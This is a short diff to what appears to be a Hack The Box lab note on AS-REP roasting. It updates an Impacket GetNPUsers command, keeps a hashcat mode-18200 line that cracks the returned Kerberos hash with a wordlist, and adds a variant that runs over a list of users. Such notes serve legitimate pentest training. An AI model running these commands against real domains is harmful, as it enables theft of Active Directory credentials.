@@ -7,9 +7,15 @@
 * Check with the following command:
 
 ```python
-Get-NPUsers.py LICORDEBELLOTA.HTB/Kaorz -dc-ip <IP> -no-pass
+impacket-GetNPUsers LICORDEBELLOTA.HTB/Kaorz -dc-ip <IP> -no-pass
 
 # You will get a TGT hash. Save the hash in a file and crack the hash
 
 hashcat -m 18200 hash rockyou.txt
+```
+
+Have a list of users?
+
+```
+impacket-GetNPUsers htb.local/ -no-pass -usersfile users
 ```
